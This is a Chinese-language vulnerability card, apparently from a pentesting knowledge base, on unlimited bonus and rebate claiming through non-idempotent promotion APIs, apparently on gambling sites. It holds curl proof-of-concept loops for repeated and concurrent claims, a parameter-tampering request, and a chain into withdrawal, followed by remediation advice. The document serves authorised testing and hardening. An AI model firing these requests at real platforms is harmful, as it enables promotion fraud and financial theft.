---
title: 活动 / 彩金 / 返水无限领取（幂等缺失）
cve: 无（业务逻辑）
severity: high
cvss: 7.9
product: 促销活动与奖励接口
versions: 任意
ports: 80, 443
keywords: promotion, bonus, 彩金, 返水, 幂等, 并发领取, 活动滥用
entry: /api/promotion/receive 重复或并发领取
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/promotion/receive     /api/bonus/claim
/api/activity/reward       /api/rebate/claim?date=
领取记录里只有一张表，无唯一约束
```

## 前置条件

- 账号（可注册多个用于对照，但只用自己名下的）。

## PoC

```bash
# A. 重复领取同一活动
for i in 1 2 3; do curl -s -X POST https://target/api/promotion/receive \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
  -d '{"promotionId":12}'; echo; done

# B. 并发领取（同一请求 10 并发）
seq 10 | xargs -P 10 -I{} curl -s -o /dev/null -X POST https://target/api/promotion/receive \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' -d '{"promotionId":12}'

# C. 参数篡改（金额/档位）
curl -s -X POST https://target/api/promotion/receive \
  -d '{"promotionId":12,"amount":9999,"level":"vip9"}'
```

## 利用步骤

1. 记录领取前余额 → 重复/并发领取 → 看余额增加次数与领取记录条数。
2. 判定：同一活动被领取多次（记录表多条）或余额复利增加即成立。
3. 参数篡改：`amount`/`level`/`vip` 是否影响奖励额（生效⇒服务端信客户端）。
4. 组合：彩金到账 → 下注 → 走提现链路（`withdraw-approval-idor.md`）看是否可提。
5. 证据：领取前后余额 + 记录条数；只用自己的账号。

## 修复与缓解（加固）

- 领取幂等：`(user_id, promotion_id)` 唯一索引；并发用锁或 `INSERT ... ON DUPLICATE`。
- 奖励金额与档位服务端计算，不接受客户端传值。
- 活动规则引擎 + 风控（同设备/同 IP/同卡多次领取告警）。

## 参考

- OWASP A04 Insecure Design；CWE-799（Improper Control of Interaction Frequency）。
